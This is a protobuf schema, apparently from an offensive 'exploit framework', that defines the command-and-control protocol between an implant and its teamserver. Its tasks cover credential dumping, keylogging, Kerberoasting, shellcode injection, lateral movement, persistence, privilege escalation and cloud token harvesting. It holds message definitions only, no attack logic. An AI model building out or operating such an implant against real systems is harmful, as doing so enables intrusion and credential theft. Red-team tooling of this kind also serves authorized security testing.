syntax = "proto3";

package erebus.c2;

option go_package = "github.com/KKingZero/erebus-exploit-framwork/pkg/pb";

// --- Enums ---

enum TaskType {
  TASK_UNKNOWN       = 0;
  TASK_SHELL         = 1;
  TASK_FILE_DOWNLOAD = 2;
  TASK_FILE_UPLOAD   = 3;
  TASK_PROCESS_LIST  = 4;
  TASK_PROCESS_KILL  = 5;
  TASK_NET_IFCONFIG  = 6;
  TASK_NET_PORTSCAN  = 7;
  TASK_CREDS_DUMP    = 8;
  TASK_SCREENSHOT    = 9;
  TASK_KEYLOG_START  = 10;
  TASK_KEYLOG_STOP   = 11;
  TASK_KEYLOG_DUMP   = 12;
  TASK_PIVOT_START   = 13;
  TASK_PIVOT_STOP    = 14;
  TASK_INJECT        = 15;
  TASK_PE_LOAD       = 16;
  TASK_SOCKS_START   = 17;
  TASK_SOCKS_STOP    = 18;
  TASK_EXIT          = 19;
  TASK_SLEEP         = 20;
  TASK_MODULE        = 21;
  TASK_LDAP_ENUM     = 22;
  TASK_KERBEROAST    = 23;
  TASK_ASREPROAST    = 24;
  TASK_LATERAL_MOVE  = 25;
  TASK_PE_LOAD_EXEC  = 26;
  TASK_PERSIST       = 27;
  TASK_PRIVESC       = 28;
}

// --- Implant <-> Teamserver ---

message Register {
  string implant_id       = 1;
  string hostname         = 2;
  string username         = 3;
  string os               = 4;
  string arch             = 5;
  uint32 pid              = 6;
  string integrity_level  = 7;
  int64  timestamp        = 8;
  bytes  hmac             = 9;   // HMAC-SHA256(secret, implant_id + timestamp)
}

message RegisterResponse {
  bool   success              = 1;
  string session_id           = 2;
  int64  next_checkin_ms      = 3;
  bytes  encrypted_session_key = 4; // AES session key encrypted with pre-shared secret
}

message Beacon {
  string       implant_id       = 1;
  string       session_id       = 2;
  int64        timestamp        = 3;
  bytes        hmac             = 4;
  repeated TaskResult results   = 5;
  bytes        encrypted_results = 6; // replaces results when session key active
}

message BeaconResponse {
  repeated Task tasks          = 1;
  int64         next_checkin_ms = 2;
  bool          terminate      = 3;
  bytes         encrypted_tasks = 4; // replaces tasks when session key active
}

message Task {
  string   task_id    = 1;
  string   implant_id = 2;
  TaskType task_type  = 3;
  bytes    data       = 4;  // Serialized per-task payload
  int64    timeout_ms = 5;
}

message TaskResult {
  string task_id          = 1;
  bool   success          = 2;
  bytes  data             = 3;  // Serialized per-task result
  string error            = 4;
  int64  execution_time_ms = 5;
}

// Helper messages for encrypted payloads
message BeaconResultsPayload {
  repeated TaskResult results = 1;
}

message BeaconTasksPayload {
  repeated Task tasks = 1;
}

// --- Per-Task Payloads (Phase 1: Shell only) ---

message ShellTask {
  string command = 1;
  repeated string args = 2;
}

message ShellResult {
  string stdout    = 1;
  string stderr    = 2;
  int32  exit_code = 3;
}

// --- File Transfer ---

message FileDownloadTask {
  string remote_path = 1;
}

message FileDownloadResult {
  string filename = 1;
  bytes  data     = 2;
}

message FileUploadTask {
  string remote_path = 1;
  bytes  data        = 2;
}

message FileUploadResult {
  bool success = 1;
}

// --- Sleep ---

message SleepTask {
  int64 sleep_ms   = 1;
  int32 jitter_pct = 2;
}

// --- Module ---

message ModuleTask {
  string module_name = 1;
  bytes  config      = 2;
}

// --- Process Management ---

message ProcessListTask {}

message ProcessListResult {
  repeated ProcessInfo processes = 1;
}

message ProcessInfo {
  uint32 pid          = 1;
  uint32 ppid         = 2;
  string name         = 3;
  string user         = 4;
  string arch         = 5;
  uint64 memory_bytes = 6;
  string command_line = 7;
}

message ProcessKillTask {
  uint32 pid = 1;
}

message ProcessKillResult {
  bool success = 1;
}

// --- Network Recon ---

message NetIfconfigTask {}

message NetIfconfigResult {
  repeated NetInterface interfaces = 1;
}

message NetInterface {
  string          name      = 1;
  repeated string addresses = 2;
  string          mac       = 3;
  uint32          mtu       = 4;
  bool            up        = 5;
}

message NetPortscanTask {
  string          target     = 1;
  repeated uint32 ports      = 2;
  uint32          timeout_ms = 3;
  uint32          threads    = 4;
}

message NetPortscanResult {
  repeated PortResult ports = 1;
}

message PortResult {
  string host    = 1;
  uint32 port    = 2;
  bool   open    = 3;
  string service = 4;
}

// --- AD Enumeration ---

message LDAPEnumConfig {
  string          target_dc     = 1;
  string          domain        = 2;
  string          username      = 3;
  string          password      = 4;
  string          ntlm_hash     = 5;
  string          query_type    = 6;
  string          custom_filter = 7;
  repeated string attributes    = 8;
}

message LDAPEnumResult {
  string              domain        = 1;
  string              dc            = 2;
  string              query_type    = 3;
  repeated LDAPEntry  entries       = 4;
  int32               total_results = 5;
}

message LDAPEntry {
  string                    dn         = 1;
  map<string, LDAPValues>   attributes = 2;
}

message LDAPValues {
  repeated string values = 1;
}

// --- Kerberos Attacks ---

message KerberoastConfig {
  string          target_dc   = 1;
  string          domain      = 2;
  string          username    = 3;
  string          password    = 4;
  string          ntlm_hash   = 5;
  repeated string target_spns = 6;
  string          encryption  = 7;
}

message KerberoastResult {
  repeated KerberoastHash hashes = 1;
}

message KerberoastHash {
  string spn              = 1;
  string sam_account_name = 2;
  string hash             = 3;
  string encryption_type  = 4;
}

message ASREPRoastConfig {
  string          target_dc    = 1;
  string          domain       = 2;
  repeated string target_users = 3;
}

message ASREPRoastResult {
  repeated ASREPHash hashes = 1;
}

message ASREPHash {
  string username = 1;
  string hash     = 2;
}

// --- Credential Dumping ---

message CredDumpConfig {
  string method        = 1;
  uint32 target_pid    = 2;
  string output_format = 3;
}

message CredDumpResult {
  string              method      = 1;
  repeated Credential credentials = 2;
}

message Credential {
  string type     = 1;
  string domain   = 2;
  string username = 3;
  string value    = 4;
  string source   = 5;
}

// --- Lateral Movement ---

message LateralMoveConfig {
  string method       = 1;
  string target       = 2;
  string domain       = 3;
  string username     = 4;
  string password     = 5;
  string ntlm_hash    = 6;
  bytes  ticket       = 7;
  string command      = 8;
  bytes  payload         = 9;
  string service_name    = 10;
  string remote_bin_path = 11; // optional PsExec service binary path (default: C:\Windows\<service>.exe)
}

message LateralMoveResult {
  string method  = 1;
  string target  = 2;
  bool   success = 3;
  string output  = 4;
}

// --- Process Injection ---

message InjectTask {
  string method          = 1;
  uint32 target_pid      = 2;
  bytes  shellcode       = 3;
  bool   start_suspended = 4;
}

message InjectResult {
  bool   success    = 1;
  uint32 target_pid = 2;
  uint32 thread_id  = 3;
}

// --- PE/Shellcode Loading ---

message PELoadTask {
  bytes  pe_data    = 1;
  string method     = 2;
  string args       = 3;
  uint32 target_pid = 4;
}

message PELoadResult {
  bool  success = 1;
  bytes output  = 2;
}

// --- Screenshot ---

message ScreenshotTask {
  uint32 monitor = 1;
  uint32 quality = 2;
}

message ScreenshotResult {
  bytes  image_data = 1;
  string format     = 2;
  uint32 width      = 3;
  uint32 height     = 4;
}

// --- Keylogger ---

message KeylogStartTask {
  bool capture_window_titles = 1;
}

message KeylogStopTask {}

message KeylogDumpTask {}

message KeylogDumpResult {
  repeated KeylogEntry entries = 1;
}

message KeylogEntry {
  string window_title = 1;
  string keys         = 2;
  int64  timestamp    = 3;
}

// --- SOCKS Proxy ---

message SocksStartTask {
  uint32 port = 1;
}

message SocksStartResult {
  bool   success = 1;
  uint32 port    = 2;
}

message SocksStopTask {}

message SocksStopResult {
  bool success = 1;
}

// --- Persistence ---

message PersistConfig {
  string method       = 1;
  string name         = 2;
  string payload_path = 3;
  string trigger      = 4;
  bytes  payload      = 5;
}

message PersistResult {
  bool   success = 1;
  string method  = 2;
  string details = 3;
}

// --- Privilege Escalation ---

message PrivescConfig {
  string method     = 1;
  uint32 target_pid = 2;
  string command    = 3;
}

message PrivescResult {
  bool   success       = 1;
  string method        = 2;
  string new_integrity = 3;
  uint32 new_pid       = 4;
}

// --- Cloud Credential Harvesting ---

message CloudHarvestConfig {
  string provider    = 1;  // "azure", "aws", "gcp", "imds", "all"
  string method      = 2;  // "cli", "imds", "managed_identity", "adconnect", "entra_token", "creds", "all"
}

message CloudHarvestResult {
  string               provider    = 1;
  string               method      = 2;
  repeated CloudToken  tokens      = 3;
  repeated CloudCredential credentials = 4;
  string               metadata    = 5;  // JSON metadata from IMDS
  string               error       = 6;
}

message CloudToken {
  string provider      = 1;
  string token_type    = 2;  // "access_token", "refresh_token", "prt", "managed_identity"
  string access_token  = 3;
  string refresh_token = 4;
  string tenant_id     = 5;
  string client_id     = 6;
  string resource      = 7;
  int64  expires_at    = 8;
  string source        = 9;  // where the token was found
}

message CloudCredential {
  string provider    = 1;  // "azure", "aws", "gcp"
  string cred_type   = 2;  // "access_key", "service_account", "password", "connection_string"
  string identity    = 3;  // username, access_key_id, service account email
  string secret      = 4;  // password, secret key, private key
  string extra       = 5;  // session token, project id, etc.
  string source      = 6;  // file path or env var where found
}
